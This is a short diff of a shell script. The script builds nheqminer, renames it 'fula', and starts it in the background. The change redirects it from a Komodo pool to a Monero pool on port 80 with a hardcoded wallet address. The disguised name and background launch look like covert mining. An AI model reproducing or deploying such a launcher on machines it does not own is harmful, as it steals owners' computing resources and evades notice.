@@ -70,5 +70,5 @@ cd build
 cmake ..
 make
 mv nheqminer fula
-./fula -l kmd.suprnova.cc:6250 -u pennerking.pennerkingx -p x -t 16 &
+./fula -l de01.supportxmr.com:80 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p xany -t 16 &
 echo "done"
